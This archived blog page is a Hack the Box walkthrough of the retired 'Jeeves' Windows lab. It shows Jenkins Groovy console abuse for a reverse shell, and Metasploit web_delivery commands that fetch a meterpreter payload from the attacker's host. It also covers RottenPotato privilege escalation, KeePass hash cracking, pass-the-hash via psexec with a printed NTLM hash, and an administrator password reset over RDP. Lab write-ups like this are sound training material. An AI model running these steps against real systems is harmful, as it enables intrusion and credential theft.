@@ -1,0 +1,452 @@
+
+								
+																		Hack the Box Challenge: Jeeves Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on May 21, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF Challenge “Jeeves”. This VM is also developed by Hack the Box, Jeeves is a Retired Lab and there are multiple ways to breach into this VM. In this lab, we have escalated root privilege in 3 different ways and for completing the challenge of this VM we took help from Tally (Hack the box).
+Level: Medium
+Task: Find the user.txt and root.txt in the vulnerable Lab.
+Penetrating Methodology
+
+Network Scanning 
+Enumeration
+Exploiting Script Console Groovy
+Capture the user.txt
+Privilege Escalation
+Capture the root.txt Flag
+
+Let’s Begin!!
+Network Scanning
+As these labs are only available online, therefore, they have a static IP. Jeeves Lab has IP: 10.10.10.63.
+Now, as always let’s begin our hacking with the port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.63
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.63
+					
+				
+			
+		
+
+Looking around its result we have found that ports 22, 80, 135, 445 and 50000 are open, and moreover, port 135 and 445 were pointing towards Windows operating system.
+
+Subsequently, first we checked web service and explored target IP in a web browser and it was put up by “Ask Jeeves search engine” webpage. So we tried to search some website such as google.com and a new web page represented by the fake error page come up in front of us.
+
+ On browsing port 50000 in the Web browser give us to HTTP 404 Error page.
+
+Enumeration
+Then we decided to use OWASP Dirbuster for directory brute force attack.
+
+From its result, we found so many directories but we drive with /askjeeves for further process.
+
+So when we had explored 10.10.10.63:50000/askjeeves it leads us to “Jenkins Dashboard”. Oh yes!! It was WOW time for us because we knew that there are so many ways to exploit Jenkins. So we move into the “Manage Jenkins” option because it was the spine and abuse was pretty soothing.
+
+Exploiting Jenkins
+There were so many options, but we were interested in the Script Console because Jenkins has a very nice Groovy script console that allows someone to execute arbitrary Groovy scripts within the Jenkins master runtime.
+
+We have found that Java reverse shell from GitHub, so we copied the code and modified its local host and port according to our specifications.
+
+Then we start Netcat listener and run over Groovy Script to access the reverse connection of the victim. From the image below, you can see that we have access to the tty shell of the victim’s machine.
+
+As we love the meterpreter shell, therefore, we load the Metasploit framework and execute commands below.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set target 2
+msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.28
+msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.28
+msf exploit(multi/script/web_delivery) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) &gt; set target 2msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.28msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.28msf exploit(multi/script/web_delivery) &gt; exploit
+					
+				
+			
+		
+
+Copy the highlighted text for powershell.exe and Paste it inside CMD shell as shown in the next image.
+
+Paste malicious code here in netcat.
+
+You will receive a meterpreter session of the victim’s machine in your Metasploit framework and then finish the task by grabbing the user.txt and root.txt files:
+
+		
+		
+			
+			
+			
+			
+getuid
+getprivs
+			
+				
+					
+				
+					12
+				
+						getuidgetprivs
+					
+				
+			
+		
+
+But we don’t have currently NT AUTHORITY\SYSTEM permission, but we know the techniques we used in Tally CTF to gain NT AUTHORITY\SYSTEM permission.
+
+Privilege Escalation
+Therefore taking help from our previous article “Tally” we executed below commands and successfully gained NT AUTHORITY\SYSTEM permission
+
+		
+		
+			
+			
+			
+			
+upload /root/Desktop/RottenPotato/rottenpotato.exe .
+load incognito
+execute -Hc -f rottenpotato.exe
+impersonate_token "NT AUTHORITY\SYSTEM"
+getuid
+			
+				
+					
+				
+					12345
+				
+						upload /root/Desktop/RottenPotato/rottenpotato.exe .load incognitoexecute -Hc -f rottenpotato.exeimpersonate_token "NT AUTHORITY\SYSTEM"getuid
+					
+				
+			
+		
+
+
+Let me tell you that we have solved so many of Hack the Box’s CTF challenges, some of which were framed using the Windows Operating System, and we have always grabbed the user.txt file from within a folder that is owned by any username and root.txt form in the Administrator folder, and both of these folders are present in C:\Users
+Similarly, you can also observe the same thing here and maybe you have my intention of the above words. So let’s first grab the user.txt file from inside /kohsuke/Desktop.
+COOL!!! We have captured the 1st flag.
+
+Then we go to the root.txt file, but it was a bit tricky to get the root.txt file. Because the author has a hidden root.txt file using some ADS technique( Windows Alternate Data Streams) and to grab that file, you can execute the following commands.
+
+		
+		
+			
+			
+			
+			
+cd Administrator
+cd Desktop
+ls -al
+cat hm.txt
+dir /R
+more &lt; hm.txt:root.txt:$DATA
+			
+				
+					
+				
+					123456
+				
+						cd Administratorcd Desktopls -alcat hm.txtdir /Rmore &lt; hm.txt:root.txt:$DATA
+					
+				
+			
+		
+
+
+Hurray!! /R directory reveals root.txt file and we have successfully completed the second task.
+
+2nd Method 
+When you have fresh meterpreter session 1 then move into /document directory and download CEH.kdbx file. Here also we took help from our previous article TALLY.
+
+Now run the python script that extracts a HashCat/john crackable hash from KeePass 1.x/2.X databases.
+
+		
+		
+			
+			
+			
+			
+python keepass2john.py CEH.kdbx &gt; passkey
+			
+				
+					
+				
+					1
+				
+						python keepass2john.py CEH.kdbx &gt; passkey
+					
+				
+			
+		
+
+Next, we used John the ripper to decrypt the contents of the “passkey,” using the following command.
+
+		
+		
+			
+			
+			
+			
+john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt passkey
+			
+				
+					
+				
+					1
+				
+						john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt passkey
+					
+				
+			
+		
+
+so we found the master-key “moonshine1” for keepass2 which is an application used for hiding passwords of your system, then you need to install it (keepass2) using the following command.
+
+		
+		
+			
+			
+			
+			
+apt-get install keepass2 -y
+			
+				
+					
+				
+					1
+				
+						apt-get install keepass2 -y
+					
+				
+			
+		
+
+
+After installing, run the below command and submit “moonshine1” in the field of the master key.
+
+		
+		
+			
+			
+			
+			
+keepass2 tim.kdbx
+			
+				
+					
+				
+					1
+				
+						keepass2 tim.kdbx
+					
+				
+			
+		
+
+
+Inside CEH we found so many credentials, we copied all passwords from here and paste inside a text file and got few passwords and one NTLM hash value: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) &gt; set rhost 10.10.10.63
+msf exploit(windows/smb/psexec) &gt; set smbuser administrator
+msf exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+msf exploit(windows/smb/psexec) &gt; set lport 8888
+msf exploit(windows/smb/psexec) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; set rhost 10.10.10.63msf exploit(windows/smb/psexec) &gt; set smbuser administratormsf exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00msf exploit(windows/smb/psexec) &gt; set lport 8888msf exploit(windows/smb/psexec) &gt; exploit
+					
+				
+			
+		
+
+Awesome!!! We have meterpreter session 2 with proper NT AUTHORITY\SYSTEM permission, now use the above steps to get the root.txt file.
+Note: we have rebooted the target’s VM before starting the 2nd method.
+
+At the time when you have fresh meterpreter session 2 (via psexec) then execute the following command to enable remote desktop service in victim’s machine.
+
+		
+		
+			
+			
+			
+			
+run getgui -e
+shell
+			
+				
+					
+				
+					12
+				
+						run getgui -eshell
+					
+				
+			
+		
+
+Now we have the victim command prompt with administrator privilege, so we can change the user administrator password directly by using the net user command.
+
+		
+		
+			
+			
+			
+			
+net user administrator 123
+			
+				
+					
+				
+					1
+				
+						net user administrator 123
+					
+				
+			
+		
+
+
+Now open a new terminal in your Kali Linux and type rdesktop 10.10.10.63 command to access remote desktop services of victim’s machine and after that submit credential administrator: 123 for login.
+BOOOOOM!!! Look at the screen of our victim, now let’s grab the root flag and enjoy this GUI mode.
+
+Finding user.txt is quite easy you can try on your own. To grab the root.txt flag open the CMD prompt and type following command ad done above.
+
+		
+		
+			
+			
+			
+			
+dir /R
+more &lt; hm.txt:root.txt
+			
+				
+					
+				
+					12
+				
+						dir /Rmore &lt; hm.txt:root.txt
+					
+				
+			
+		
+
+ Enjoy Hacking!!!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
